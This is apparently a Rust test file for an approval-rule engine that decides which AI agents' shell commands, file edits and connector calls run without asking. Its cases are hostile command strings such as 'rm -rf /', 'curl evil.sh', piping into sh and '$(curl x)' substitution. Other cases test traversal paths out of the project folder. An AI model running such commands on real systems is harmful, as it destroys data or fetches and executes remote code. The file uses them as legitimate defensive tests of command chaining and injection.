//! Electron `shared/approval-rules.test.ts`, case by case, through the app's own decision path: every request a run
//! raises goes through `Channel::ask_by_run`, which reads the saved rules (`decide_by_saved_rules`) before a card is
//! drawn. Rules are put in a temporary store as Settings or a card's "don't ask again" would save them. A read has no
//! card of its own (Electron's `ruledActionOf` never reads one either), so `read` rules are shown on the evaluator the
//! channel calls, and shown not to speak for an edit through the channel.
use super::*;
use crate::approval_rules::{
    decide_by_rules, diff_paths, enforced_answer_decision, inside_folder, rule_candidate_of, rule_refusal_for,
    rule_sentence, ruled_action_of, unwrapped_command, ApprovalRule, RequestView, RuleContext, RuleEffect, RuleKind,
    RuleVerdict, RuledAction, COMPOUND_REFUSAL,
};
use crate::store::Store;
use std::path::PathBuf;
use std::sync::Arc;
use std::time::{Duration, Instant};

const FOLDER: &str = r"C:\Users\person\project";

static NEXT: std::sync::atomic::AtomicU64 = std::sync::atomic::AtomicU64::new(0);

struct Host {
    ch: Arc<Channel>,
    store: Store,
    root: PathBuf,
    _hook: crate::native::hooks::Guard,
}
impl Drop for Host {
    fn drop(&mut self) {
        let _ = std::fs::remove_dir_all(&self.root);
    }
}

fn host() -> Host {
    let root = std::env::temp_dir().join(format!(
        "locust-rules-cases-{}-{}",
        std::process::id(),
        NEXT.fetch_add(1, std::sync::atomic::Ordering::Relaxed)
    ));
    let _ = std::fs::remove_dir_all(&root);
    std::fs::create_dir_all(root.join("electron")).unwrap();
    let store = Store::new(root.join("native"), root.join("electron")).unwrap();
    let hook = crate::native::hooks::install(store.clone(), None);
    let ch = Channel::new();
    ch.register_teammate("mission_wren", "tm_wren");
    Host { ch, store, root, _hook: hook }
}

fn save(h: &Host, effect: RuleEffect, kind: RuleKind, pattern: &str, teammate: Option<&str>, folder: Option<&str>) {
    crate::approval_rule_store::add(
        &h.store,
        crate::approval_rules::ApprovalRuleDraft {
            effect,
            kind,
            pattern: pattern.into(),
            teammate_id: teammate.map(str::to_owned),
            folder: folder.map(str::to_owned),
        },
    )
    .unwrap();
}

fn request(mission: &str, runtime: &str, kind: Kind, summary: &str, detail: &str, cwd: Option<&str>) -> Request {
    Request {
        approval_id: new_id(),
        mission_id: mission.into(),
        runtime: runtime.into(),
        kind,
        summary: summary.into(),
        detail: detail.into(),
        cwd: cwd.map(str::to_owned),
        requested_at: now_iso(),
        always_covers: None,
        always_key: None,
        data_sent_says: None,
        reversible_says: None,
        patch: None,
        claude_input: None,
        skippable: false,
        answer_in: None,
        questions: Vec::new(),
    }
}

/// What the app did with a request: "allow" or "deny" by a saved rule, or "ask" with the card's note.
fn decided(h: &Host, card: Request) -> (&'static str, Option<String>) {
    let ch = h.ch.clone();
    let id = card.approval_id.clone();
    let handle = std::thread::spawn(move || ch.ask_by(card, &|| false));
    let deadline = Instant::now() + crate::load_waits::UNDER_LOAD;
    let mut note = None;
    while !handle.is_finished() {
        assert!(Instant::now() < deadline, "the request was never answered");
        if let Some(raised) = h.ch.waiting().into_iter().find(|r| r.approval_id == id) {
            note = Some(card_note(&raised));
            let release = if raised.kind == Kind::Question {
                Answer::Answers { approval_id: id.clone(), answers: Vec::new() }
            } else {
                Answer::Decision { approval_id: id.clone(), decision: Decision::Deny, reason: None }
            };
            h.ch.decide(release).unwrap();
            break;
        }
        std::thread::sleep(Duration::from_millis(2));
    }
    let answered = handle.join().unwrap().unwrap();
    if note.is_some() {
        return ("ask", note);
    }
    match answered.0 {
        Answer::Decision { decision: Decision::ApproveOnce, .. } => ("allow", None),
        Answer::Decision { decision: Decision::Deny, .. } => ("deny", None),
        other => panic!("not a rule's answer: {other:?}"),
    }
}

/// A Claude Code tool call, raised the way a Claude run raises it (`ask_claude`), decided as `decided` reads it.
fn claude(h: &Host, mission: &str, tool: &str, input: Value, cwd: &str) -> &'static str {
    let ch = h.ch.clone();
    let (mission, tool) = (mission.to_owned(), tool.to_owned());
    let cwd = cwd.to_owned();
    let before: Vec<String> = h.ch.waiting().into_iter().map(|r| r.approval_id).collect();
    let handle = std::thread::spawn(move || ch.ask_claude("run_1", &mission, "permission", &tool, &input, &cwd, &|| false));
    let deadline = Instant::now() + crate::load_waits::UNDER_LOAD;
    let mut asked = false;
    while !handle.is_finished() {
        assert!(Instant::now() < deadline, "the request was never answered");
        if let Some(raised) = h.ch.waiting().into_iter().find(|r| !before.contains(&r.approval_id)) {
            h.ch.decide(Answer::Decision { approval_id: raised.approval_id, decision: Decision::Deny, reason: None }).unwrap();
            asked = true;
            break;
        }
        std::thread::sleep(Duration::from_millis(2));
    }
    let answered = handle.join().unwrap().unwrap();
    if asked {
        return "ask";
    }
    match answered["behavior"].as_str() {
        Some("allow") => "allow",
        Some("deny") => "deny",
        _ => panic!("not a rule's answer: {answered}"),
    }
}

fn bash(h: &Host, command: &str) -> &'static str {
    claude(h, "mission_wren", "Bash", json!({ "command": command }), FOLDER)
}

fn edit(h: &Host, path: &str, cwd: &str) -> &'static str {
    claude(h, "mission_wren", "Edit", json!({ "file_path": path, "old_string": "a", "new_string": "b" }), cwd)
}

fn copilot_change(h: &Host, files: &str, cwd: &str) -> &'static str {
    decided(h, request("mission_wren", "copilot", Kind::FileChange, "Change 2 files", files, Some(cwd))).0
}

fn rule(effect: RuleEffect, kind: RuleKind, pattern: &str) -> ApprovalRule {
    ApprovalRule {
        rule_id: format!("{}-{}-{pattern}", effect.as_str(), kind.as_str()),
        effect,
        kind,
        pattern: pattern.into(),
        teammate_id: None,
        folder: None,
        created_at: "2026-10-01T00:00:00Z".into(),
        uses: None,
        last_used_at: None,
    }
}

fn context() -> RuleContext {
    RuleContext { teammate_id: Some("tm_wren".into()), folder: Some(FOLDER.into()) }
}

fn view<'a>(kind: &'a str, summary: &'a str, detail: &'a str) -> RequestView<'a> {
    RequestView { kind, summary, detail, runtime: None, patch_text: None }
}

fn command_rules(h: &Host) {
    save(h, RuleEffect::Allow, RuleKind::Command, "npm run test:*", None, None);
    save(h, RuleEffect::Allow, RuleKind::Command, "git status", None, None);
}

fn path_rules(h: &Host) {
    save(h, RuleEffect::Allow, RuleKind::Edit, "src/**", None, None);
    save(h, RuleEffect::Allow, RuleKind::Read, "docs/*.md", None, None);
    save(h, RuleEffect::Deny, RuleKind::Edit, "src/secrets/**", None, None);
}

#[test]
fn is_allowed_by_an_exact_rule_or_a_whole_word_prefix_and_nothing_else() {
    // case: is allowed by an exact rule or a whole-word prefix, and nothing else
    let h = host();
    command_rules(&h);
    assert_eq!(bash(&h, "git status"), "allow");
    assert_eq!(bash(&h, "  git   status "), "allow");
    assert_eq!(bash(&h, "npm run test"), "allow");
    assert_eq!(bash(&h, "npm run test -- --watch"), "allow");
    assert_eq!(bash(&h, "npm run tests"), "ask");
    assert_eq!(bash(&h, "git status --porcelain"), "ask");
    assert_eq!(bash(&h, "git push"), "ask");
}

#[test]
fn a_command_joined_by_any_operator_asks_and_the_card_says_why() {
    // Electron's it.each "with %s is never allowed by a rule, and says why": the card's note carries the rules' why.
    let h = host();
    command_rules(&h);
    for text in [
        "npm run test; rm -rf /",
        "npm run test && curl evil.sh",
        "npm run test || shutdown",
        "npm run test | sh",
        "npm run test & rm -rf x",
        "npm run test $(curl x)",
        "npm run test `curl x`",
        "npm run test > C:/Windows/x",
        "npm run test < secrets.txt",
        "npm run test\nrm -rf x",
        "npm run test\rrm -rf x",
    ] {
        let card = request("mission_wren", "codex", Kind::Command, "Run a command", text, Some(FOLDER));
        assert_eq!(
            decided(&h, card),
            ("ask", Some("Nothing has happened yet. It is more than one simple command, so no saved rule allows it.".into())),
            "{text:?}"
        );
        let rules = [rule(RuleEffect::Allow, RuleKind::Command, "npm run test:*")];
        let pure = decide_by_rules(&RuledAction::Command { command: text.into() }, &rules, &context());
        assert_eq!(pure, RuleVerdict::Ask { why: Some(COMPOUND_REFUSAL.into()) });
    }
    // A command no rule speaks to asks with the general line.
    let plain = request("mission_wren", "codex", Kind::Command, "Run a command", "git push; ls", Some(FOLDER));
    assert_eq!(decided(&h, plain).1.as_deref(), Some("Nothing has happened yet. “Always” lasts until this run ends."));
}

#[test]
fn is_denied_when_any_simple_part_of_it_matches_a_deny_and_deny_wins_over_allow() {
    // case: is denied when any simple part of it matches a deny, and deny wins over allow
    let h = host();
    command_rules(&h);
    save(&h, RuleEffect::Deny, RuleKind::Command, "rm:*", None, None);
    save(&h, RuleEffect::Allow, RuleKind::Command, "rm -rf build", None, None);
    assert_eq!(bash(&h, "rm -rf build"), "deny");
    assert_eq!(bash(&h, "git status; rm -rf build"), "deny");
    assert_eq!(bash(&h, "npm run test && rm x"), "deny");
    assert_eq!(bash(&h, "echo $(rm x)"), "deny");
}

#[test]
fn is_matched_case_blind_only_in_a_windows_folder_2026_10_10_sweep() {
    // case: is matched case-blind only in a Windows folder (2026-10-10 sweep)
    let h = host();
    path_rules(&h);
    assert_eq!(edit(&h, "SRC/app.ts", FOLDER), "allow");
    assert_eq!(edit(&h, "/work/src/x.ts", "/work"), "allow");
    assert_eq!(edit(&h, "/work/SRC/x.ts", "/work"), "ask");
}

#[test]
fn is_allowed_when_every_path_is_inside_the_folder_and_matches() {
    // case: is allowed when every path is inside the folder and matches
    let h = host();
    path_rules(&h);
    assert_eq!(edit(&h, "src/app.ts", FOLDER), "allow");
    assert_eq!(edit(&h, &format!("{FOLDER}\\src\\deep\\x.ts"), FOLDER), "allow");
    assert_eq!(copilot_change(&h, "src/app.ts, README.md", FOLDER), "ask");
    // A read rule speaks for a read, never for an edit of the same file.
    assert_eq!(copilot_change(&h, "docs/plan.md", FOLDER), "ask");
    let rules = [
        rule(RuleEffect::Allow, RuleKind::Edit, "src/**"),
        rule(RuleEffect::Allow, RuleKind::Read, "docs/*.md"),
        rule(RuleEffect::Deny, RuleKind::Edit, "src/secrets/**"),
    ];
    let read = |path: &str| RuledAction::Read { paths: vec![path.into()] };
    assert_eq!(decide_by_rules(&read("docs/plan.md"), &rules, &context()).decision(), "allow");
    assert_eq!(decide_by_rules(&read("docs/deep/plan.md"), &rules, &context()).decision(), "ask");
    // And an edit rule never speaks for a read.
    assert_eq!(decide_by_rules(&read("src/app.ts"), &rules, &context()).decision(), "ask");
}

#[test]
fn is_never_allowed_outside_the_folder_however_the_path_is_written() {
    // case: is never allowed outside the folder, however the path is written
    let h = host();
    path_rules(&h);
    for path in ["../other/src/x.ts", "src/../../other/src/x.ts", r"C:\Windows\src\x.ts", "/etc/src/x", r"D:\project\src\x.ts"] {
        assert_eq!(edit(&h, path, FOLDER), "ask", "{path}");
    }
}

#[test]
fn is_denied_when_any_path_matches_a_deny_even_beside_allowed_ones() {
    // case: is denied when any path matches a deny, even beside allowed ones
    let h = host();
    path_rules(&h);
    assert_eq!(copilot_change(&h, "src/app.ts, src/secrets/key.ts", FOLDER), "deny");
}

#[test]
fn reads_the_folder_without_case_on_windows() {
    // case: reads the folder without case on Windows
    assert_eq!(inside_folder("c:/users/PERSON/Project/src/a.ts", FOLDER).as_deref(), Some("src/a.ts"));
    assert_eq!(inside_folder("C:/Users/person/project-other/a.ts", FOLDER), None);
    assert_eq!(inside_folder("/home/me/proj/a.ts", "/home/me/proj").as_deref(), Some("a.ts"));
    assert_eq!(inside_folder("/home/me/Proj/a.ts", "/home/me/proj"), None);
    // The card reads its file the same way, so the rule sees it inside the folder.
    let (_, summary, detail, _, _) =
        describe_claude_tool("Edit", &json!({ "file_path": "c:/users/PERSON/Project/src/a.ts" }), FOLDER);
    assert_eq!((summary.as_str(), detail.as_str()), ("Change 1 file", "src/a.ts"));
}

#[test]
fn a_rule_for_one_teammate_or_one_folder_does_not_speak_for_another() {
    // case: a rule for one teammate or one folder does not speak for another
    // A saved folder is absolute on this machine; the scope is the point, not the folder's style.
    let h = host();
    h.ch.register_teammate("mission_juno", "tm_juno");
    save(&h, RuleEffect::Allow, RuleKind::Command, "git status", Some("tm_wren"), Some("/home/person/project"));
    let ask = |mission: &str, cwd: Option<&str>| {
        decided(&h, request(mission, "codex", Kind::Command, "Run a command", "git status", cwd)).0
    };
    assert_eq!(ask("mission_wren", Some("/home/person/project")), "allow");
    assert_eq!(ask("mission_juno", Some("/home/person/project")), "ask");
    assert_eq!(ask("mission_wren", Some("/home/person/other")), "ask");
    assert_eq!(ask("mission_wren", None), "ask");
}

#[test]
fn a_connector_rule_names_its_server_and_optionally_one_tool() {
    // case: a connector rule names its server, and optionally one tool
    let h = host();
    save(&h, RuleEffect::Allow, RuleKind::Connector, "robinhood/get_quotes", None, None);
    save(&h, RuleEffect::Deny, RuleKind::Connector, "gmail", None, None);
    assert_eq!(claude(&h, "mission_wren", "mcp__robinhood__get_quotes", json!({}), FOLDER), "allow");
    assert_eq!(claude(&h, "mission_wren", "mcp__robinhood__place_order", json!({}), FOLDER), "ask");
    assert_eq!(claude(&h, "mission_wren", "mcp__gmail__send", json!({}), FOLDER), "deny");
}

#[test]
fn a_question_to_the_person_is_never_governed() {
    // case: a question to the person is never governed
    assert_eq!(
        decide_by_rules(&RuledAction::Other, &[rule(RuleEffect::Allow, RuleKind::Command, "x")], &context()),
        RuleVerdict::Ask { why: None }
    );
    let h = host();
    save(&h, RuleEffect::Allow, RuleKind::Command, "x", None, None);
    let question = request("mission_wren", "codex", Kind::Question, "Answer a question", "x", Some(FOLDER));
    assert_eq!(decided(&h, question).0, "ask");
}

#[test]
fn reads_the_command_inside_a_shell_wrapper_only_when_the_whole_text_is_exactly_one() {
    // case: reads the command inside a shell wrapper, only when the whole text is exactly one
    let wrapped = r#""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe" -Command 'git status --short'"#;
    assert_eq!(
        ruled_action_of(view("command", "Run a command", wrapped)),
        RuledAction::Command { command: "git status --short".into() }
    );
    assert_eq!(unwrapped_command("pwsh -NoProfile -Command 'echo ''hi'''"), "echo 'hi'");
    assert_eq!(unwrapped_command("/bin/bash -lc 'ls -la'"), "ls -la");
    assert_eq!(unwrapped_command("powershell -Command 'a'; rm x"), "powershell -Command 'a'; rm x");
    assert_eq!(unwrapped_command("bash -lc 'a' && b"), "bash -lc 'a' && b");
    // Through the channel: the inner command is what the rule matches, and it is still held to the compound rule.
    let h = host();
    save(&h, RuleEffect::Allow, RuleKind::Command, "git status --short", None, None);
    let card = |detail: &str| request("mission_wren", "codex", Kind::Command, "Run a command", detail, Some(FOLDER));
    assert_eq!(decided(&h, card(wrapped)).0, "allow");
    let sneaky = r#""C:\\x\\powershell.exe" -Command 'git status --short; rm -rf x'"#;
    assert_eq!(decided(&h, card(sneaky)).0, "ask");
}

#[test]
fn reads_a_command_only_when_it_is_one() {
    // case: reads a command only when it is one
    assert_eq!(
        ruled_action_of(view("command", "Run a command", "git status")),
        RuledAction::Command { command: "git status".into() }
    );
    assert_eq!(ruled_action_of(view("command", "Use WebFetch", r#"{"url":"x"}"#)), RuledAction::Other);
    assert_eq!(ruled_action_of(view("command", "Run a command it did not describe", "")), RuledAction::Other);
}

#[test]
fn reads_a_changes_files_from_its_diff_else_as_each_runtime_names_them_else_not_at_all() {
    // case: reads a change's files from its diff, else as each runtime names them, else not at all
    let diff = "diff --git a/src/a.ts b/src/a.ts\n--- a/src/a.ts\n+++ b/src/a.ts\n@@ -1 +1 @@\n-x\n+y\n";
    let change = |summary, detail, runtime, patch_text| RequestView { kind: "file-change", summary, detail, runtime: Some(runtime), patch_text };
    assert_eq!(
        ruled_action_of(change("Change files", "Rewrites the helper", "codex", Some(diff))),
        RuledAction::Edit { paths: vec!["src/a.ts".into()] }
    );
    assert_eq!(ruled_action_of(change("Change files", "Rewrites the helper", "codex", None)), RuledAction::Other);
    assert_eq!(
        ruled_action_of(change("Change 1 file", "src/b.ts", "claude", None)),
        RuledAction::Edit { paths: vec!["src/b.ts".into()] }
    );
    assert_eq!(
        ruled_action_of(change("Change 2 files", "a.ts, b.ts", "copilot", None)),
        RuledAction::Edit { paths: vec!["a.ts".into(), "b.ts".into()] }
    );
    assert_eq!(diff_paths("--- /dev/null\n+++ b/new.md\n"), vec!["new.md".to_owned()]);
}

#[test]
fn reads_a_connector_by_its_tool_and_server_and_a_question_never() {
    // case: reads a connector by its tool and server, and a question never
    assert_eq!(
        ruled_action_of(view("connector", "Use list_issues on github", "")),
        RuledAction::Connector { tool: "list_issues".into(), server: "github".into() }
    );
    assert_eq!(ruled_action_of(view("question", "Answer a question", "")), RuledAction::Other);
}

fn candidate(action: &RuledAction) -> Option<(RuleEffect, RuleKind, String, Option<String>, Option<String>)> {
    rule_candidate_of(action, &context()).map(|d| (d.effect, d.kind, d.pattern, d.teammate_id, d.folder))
}

#[test]
fn is_the_exact_command_the_exact_file_inside_the_folder_or_the_one_connector_tool_scoped() {
    // case: is the exact command, the exact file inside the folder, or the one connector tool, scoped
    let scope = (Some("tm_wren".to_owned()), Some(FOLDER.to_owned()));
    assert_eq!(
        candidate(&RuledAction::Command { command: "git  status".into() }),
        Some((RuleEffect::Allow, RuleKind::Command, "git status".into(), scope.0.clone(), scope.1.clone()))
    );
    assert_eq!(
        candidate(&RuledAction::Edit { paths: vec!["src/a.ts".into()] }),
        Some((RuleEffect::Allow, RuleKind::Edit, "src/a.ts".into(), scope.0.clone(), scope.1.clone()))
    );
    // A read is saved as a read rule, as approval-rules.ts gives it `kind: action.kind`.
    assert_eq!(
        candidate(&RuledAction::Read { paths: vec!["docs/plan.md".into()] }),
        Some((RuleEffect::Allow, RuleKind::Read, "docs/plan.md".into(), scope.0.clone(), scope.1.clone()))
    );
    assert_eq!(
        candidate(&RuledAction::Connector { server: "github".into(), tool: "list_issues".into() }).map(|c| c.2),
        Some("github/list_issues".into())
    );
    // Through the card's "Yes, and don't ask again": the exact command, scoped to its teammate and folder.
    let h = host();
    let raised = h.ch.clone();
    let card = request("mission_wren", "codex", Kind::Command, "Run a command", "git  status", Some("/home/person/project"));
    let id = card.approval_id.clone();
    let asking = std::thread::spawn(move || raised.ask_by(card, &|| false));
    let deadline = Instant::now() + crate::load_waits::UNDER_LOAD;
    let waiting = loop {
        if let Some(w) = h.ch.waiting().into_iter().find(|r| r.approval_id == id) {
            break w;
        }
        assert!(Instant::now() < deadline, "no card came");
        std::thread::sleep(Duration::from_millis(2));
    };
    save_pending_rule(&h.ch, &waiting, RuleEffect::Allow).unwrap();
    h.ch.decide(Answer::Decision { approval_id: id, decision: Decision::ApproveOnce, reason: None }).unwrap();
    asking.join().unwrap().unwrap();
    let saved = crate::approval_rule_store::list(&h.store).unwrap();
    assert_eq!(saved.len(), 1);
    assert_eq!(
        (&saved[0].effect, &saved[0].kind, saved[0].pattern.as_str(), saved[0].teammate_id.as_deref(), saved[0].folder.as_deref()),
        (&RuleEffect::Allow, &RuleKind::Command, "git status", Some("tm_wren"), Some("/home/person/project"))
    );
}

#[test]
fn is_nothing_for_what_a_rule_could_not_hold_exactly() {
    // case: is nothing for what a rule could not hold exactly
    assert_eq!(candidate(&RuledAction::Command { command: "git status && rm x".into() }), None);
    assert_eq!(candidate(&RuledAction::Edit { paths: vec!["../other/a.ts".into()] }), None);
    assert_eq!(candidate(&RuledAction::Edit { paths: vec!["a.ts".into(), "b.ts".into()] }), None);
    assert_eq!(candidate(&RuledAction::Edit { paths: vec!["src/*.ts".into()] }), None);
    assert_eq!(candidate(&RuledAction::Read { paths: vec!["../other/a.md".into()] }), None);
    assert_eq!(candidate(&RuledAction::Other), None);
}

#[test]
fn a_saved_candidate_allows_exactly_what_it_was_made_from_and_no_more() {
    // case: a saved candidate allows exactly what it was made from, and no more
    let h = host();
    let draft = rule_candidate_of(
        &RuledAction::Command { command: "git status".into() },
        &RuleContext { teammate_id: Some("tm_wren".into()), folder: Some("/home/person/project".into()) },
    )
    .unwrap();
    crate::approval_rule_store::add(&h.store, draft).unwrap();
    let ask = |command: &str| {
        decided(&h, request("mission_wren", "codex", Kind::Command, "Run a command", command, Some("/home/person/project"))).0
    };
    assert_eq!(ask("git status"), "allow");
    assert_eq!(ask("git status --short"), "ask");
}

#[test]
fn reads_as_what_the_teammate_may_do() {
    // case: reads as what the teammate may do
    let mut mine = rule(RuleEffect::Allow, RuleKind::Command, "npm run test:*");
    mine.teammate_id = Some("tm_wren".into());
    mine.folder = Some(FOLDER.into());
    assert_eq!(rule_sentence(&mine, Some("Wren")), "Wren may run commands starting \"npm run test\" in project without asking.");
    assert_eq!(rule_sentence(&rule(RuleEffect::Deny, RuleKind::Command, "git push"), None), "Any teammate may not run \"git push\".");
    assert_eq!(
        rule_sentence(&rule(RuleEffect::Allow, RuleKind::Edit, "src/**"), None),
        "Any teammate may change files matching src/** without asking."
    );
}

#[test]
fn turns_always_into_this_once_for_a_command_that_reaches_other_programs_and_says_so() {
    // case: turns Always into this once for a command that reaches other programs, and says so
    let (decision, note) = enforced_answer_decision(view("command", "Run a command", "Stop-Process -Name node"), "approve-always");
    assert_eq!(decision, "approve-once");
    assert!(note.as_deref().unwrap().starts_with("asked each time: stops every node"), "{note:?}");
    // Through the channel: the card's Always is applied as once, and the record says so. (Stopping node by name is
    // refused before any card by the command guard, so the card here stops another program by name.)
    let h = host();
    let card = request("mission_wren", "codex", Kind::Command, "Run a command", "Stop-Process -Name notepad", Some(FOLDER));
    let id = card.approval_id.clone();
    let raised = h.ch.clone();
    let asking = std::thread::spawn(move || raised.ask_by(card, &|| false));
    let deadline = Instant::now() + crate::load_waits::UNDER_LOAD;
    while !h.ch.waiting().iter().any(|r| r.approval_id == id) {
        assert!(Instant::now() < deadline, "no card came");
        std::thread::sleep(Duration::from_millis(2));
    }
    // The card hides Always here; the host holds to it whatever the window sends.
    let _ = h.ch.decide(Answer::Decision { approval_id: id, decision: Decision::ApproveAlways, reason: None });
    let (answer, _) = asking.join().unwrap().unwrap();
    assert!(matches!(answer, Answer::Decision { decision: Decision::ApproveOnce, .. }), "{answer:?}");
    let record = h.ch.take_recorded_for("mission_wren").pop().unwrap();
    assert_eq!(record.answer, "allowed");
    assert!(record.words.as_deref().unwrap_or("").starts_with("asked each time: stops every notepad"), "{:?}", record.words);
}

#[test]
fn leaves_an_ordinary_command_a_denial_and_a_question_alone() {
    // case: leaves an ordinary command, a denial and a question alone
    assert_eq!(
        enforced_answer_decision(view("command", "Run a command", "git status"), "approve-always"),
        ("approve-always".to_owned(), None)
    );
    assert_eq!(
        enforced_answer_decision(view("command", "Run a command", "Stop-Process -Name node"), "deny"),
        ("deny".to_owned(), None)
    );
    // A question's answers carry no decision, and are applied as they came.
    assert_eq!(enforced_answer_decision(view("question", "Which?", ""), ""), (String::new(), None));
    // Through the channel: an ordinary command's Always is kept as Always.
    let h = host();
    let card = request("mission_wren", "codex", Kind::Command, "Run a command", "git status", Some(FOLDER));
    let id = card.approval_id.clone();
    let raised = h.ch.clone();
    let asking = std::thread::spawn(move || raised.ask_by(card, &|| false));
    let deadline = Instant::now() + crate::load_waits::UNDER_LOAD;
    while !h.ch.waiting().iter().any(|r| r.approval_id == id) {
        assert!(Instant::now() < deadline, "no card came");
        std::thread::sleep(Duration::from_millis(2));
    }
    h.ch.decide(Answer::Decision { approval_id: id, decision: Decision::ApproveAlways, reason: None }).unwrap();
    asking.join().unwrap().unwrap();
    let record = h.ch.take_recorded_for("mission_wren").pop().unwrap();
    assert_eq!((record.answer.as_str(), record.words), ("allowed-always", None));
}

#[test]
fn refuses_a_rule_for_such_a_command_with_the_cards_own_sentence_and_none_for_an_ordinary_one() {
    // case: refuses a rule for such a command with the card's own sentence, and none for an ordinary one
    let taskkill = "taskkill /F /IM python.exe";
    assert_eq!(
        rule_refusal_for(view("command", "Run a command", taskkill)).as_deref(),
        Some("Not saved as a rule: this command stops every python.exe. Stops every python.exe on this computer, not only the ones this run started. Locust asks each time.")
    );
    assert_eq!(rule_refusal_for(view("command", "Run a command", "git status")), None);
    assert!(rule_refusal_for(view("command", "Run a command", "git status; taskkill /F /IM python.exe"))
        .unwrap()
        .starts_with("Not saved as a rule"));
    // Through the card: saving the rule is refused with that sentence, and nothing is saved.
    let h = host();
    let card = request("mission_wren", "codex", Kind::Command, "Run a command", taskkill, Some("/home/person/project"));
    let id = card.approval_id.clone();
    let raised = h.ch.clone();
    let asking = std::thread::spawn(move || raised.ask_by(card, &|| false));
    let deadline = Instant::now() + crate::load_waits::UNDER_LOAD;
    let waiting = loop {
        if let Some(w) = h.ch.waiting().into_iter().find(|r| r.approval_id == id) {
            break w;
        }
        assert!(Instant::now() < deadline, "no card came");
        std::thread::sleep(Duration::from_millis(2));
    };
    assert_eq!(
        save_pending_rule(&h.ch, &waiting, RuleEffect::Allow).unwrap_err(),
        "Not saved as a rule: this command stops every python.exe. Stops every python.exe on this computer, not only the ones this run started. Locust asks each time."
    );
    h.ch.decide(Answer::Decision { approval_id: id, decision: Decision::Deny, reason: None }).unwrap();
    asking.join().unwrap().unwrap();
    assert!(crate::approval_rule_store::list(&h.store).unwrap().is_empty());
}

// A saved deny tells the run which rule refused it, in the rule's own sentence (Electron's decideByRules gives
// ruleSentence as the denial's reason), so the teammate can say why instead of retrying.
#[test]
fn a_saved_deny_tells_the_run_which_rule_refused_it() {
    let h = host();
    save(&h, RuleEffect::Deny, RuleKind::Command, "git push", None, None);
    let ch = h.ch.clone();
    let card = request("mission_wren", "codex", Kind::Command, "Run a command", "git push", Some(FOLDER));
    let handle = std::thread::spawn(move || ch.ask_by(card, &|| false));
    let deadline = Instant::now() + crate::load_waits::UNDER_LOAD;
    while !handle.is_finished() {
        assert!(Instant::now() < deadline, "a saved deny should answer without a card");
        assert!(h.ch.waiting().is_empty(), "a saved deny raised a card");
        std::thread::sleep(Duration::from_millis(2));
    }
    match handle.join().unwrap().unwrap().0 {
        Answer::Decision { decision: Decision::Deny, reason: Some(reason), .. } => {
            assert_eq!(reason, rule_sentence(&rule(RuleEffect::Deny, RuleKind::Command, "git push"), None));
        }
        other => panic!("not a saved deny with its sentence: {other:?}"),
    }
}
